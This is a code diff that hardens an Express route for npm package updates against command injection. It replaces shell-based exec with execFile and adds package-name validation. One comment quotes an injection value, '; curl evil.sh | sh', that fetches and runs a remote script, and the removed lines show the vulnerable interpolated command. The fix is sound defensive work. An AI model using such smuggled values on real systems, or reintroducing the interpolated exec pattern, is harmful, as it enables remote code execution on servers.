@@ -1,14 +1,34 @@
 import { Router, Response, NextFunction } from 'express';
 import { authenticate, AuthRequest } from '../middleware/auth';
 import { authorize, requirePermission } from '../middleware/authorize';
-import { exec } from 'child_process';
+import { execFile } from 'child_process';
 import { promisify } from 'util';
 import * as fs from 'fs/promises';
 import * as path from 'path';
 import logger from '../../utils/logger';
 import { getErrorMessage, errorProps } from '../../utils/errors';
 
-const execAsync = promisify(exec);
+/**
+ * `execFile`, never `exec`.
+ *
+ * `exec` runs its argument through a shell, and this route built that argument
+ * by interpolating a client-supplied package list. A package named
+ * `; curl evil.sh | sh` was therefore executed as the server user — confirmed
+ * remote code execution behind the admin role. `execFile` takes an argv array
+ * and spawns the binary directly, so no metacharacter in an argument can ever
+ * be read as syntax.
+ */
+const execFileAsync = promisify(execFile);
+
+/**
+ * npm's package-name grammar, near enough: optional `@scope/`, then lowercase
+ * letters, digits, and `.-_`.
+ *
+ * Belt and braces alongside `execFile` — nothing here can escape an argv array
+ * anyway, but a name that does not look like a package should not reach npm at
+ * all, and a leading `-` would be read as a flag rather than a package.
+ */
+const PACKAGE_NAME = /^(@[a-z0-9][a-z0-9._-]*\/)?[a-z0-9][a-z0-9._-]*$/;
 /** A dependency discovered by parsing a package.json in this repo. */
 interface ComponentInfo {
   name: string;
@@ -180,7 +200,12 @@ router.get('/updates', requirePermission('settings', 'read'), async (req: AuthRe
     // Check each package for updates (limited to avoid timeout)
     for (const component of components.slice(0, 50)) { // Limit to 50 to avoid timeout
       try {
-        const { stdout } = await execAsync(`npm view ${component.name} version`, { timeout: 5000 });
+        // The name comes from a parsed package.json rather than a request, but
+        // it is still not this route's to trust.
+        if (!PACKAGE_NAME.test(component.name)) continue;
+        const { stdout } = await execFileAsync('npm', ['view', component.name, 'version'], {
+          timeout: 5000,
+        });
         const latestVersion = stdout.trim();
         const currentVersion = component.currentVersion.replace(/[\^~]/, '');
 
@@ -241,14 +266,24 @@ router.post('/update', authorize(['admin']), async (req: AuthRequest, res: Respo
     const rootDir = path.resolve(backendDir, '..');
     const workDir = type === 'frontend' ? rootDir : backendDir;
 
-    // Build npm update command
-    const packageList = packages.join(' ');
-    const command = `npm update ${packageList}`;
+    // Only the names that are strings are echoed back. Interpolating the raw
+    // entries would itself throw on something like `{ toString: 'nope' }`, where
+    // the property shadows the method and is not callable - turning a rejected
+    // request into a 500 in the code that exists to reject it.
+    const invalid = packages.filter(
+      (name: unknown) => typeof name !== 'string' || !PACKAGE_NAME.test(name)
+    );
+    if (invalid.length > 0) {
+      const named = invalid.filter((name: unknown): name is string => typeof name === 'string');
+      return res.status(400).json({
+        success: false,
+        error: named.length > 0 ? `Not valid package names: ${named.join(', ')}` : 'Not valid package names',
+      });
+    }
 
-    logger.info(`Updating packages: ${packageList} in ${type}`);
+    logger.info(`Updating packages: ${packages.join(', ')} in ${type}`);
 
-    // Execute update
-    const { stdout, stderr } = await execAsync(command, {
+    const { stdout, stderr } = await execFileAsync('npm', ['update', ...packages], {
       cwd: workDir,
       timeout: 300000, // 5 minutes timeout
     });
@@ -305,12 +340,12 @@ router.post('/update-all', authorize(['admin']), async (req: AuthRequest, res: R
     const workDir = type === 'frontend' ? rootDir : backendDir;
 
     // Update all packages
-    const command = 'npm update';
+
 
     logger.info(`Updating all packages in ${type}`);
 
     // Execute update
-    const { stdout, stderr } = await execAsync(command, {
+    const { stdout, stderr } = await execFileAsync('npm', ['update'], {
       cwd: workDir,
       timeout: 600000, // 10 minutes timeout
     });
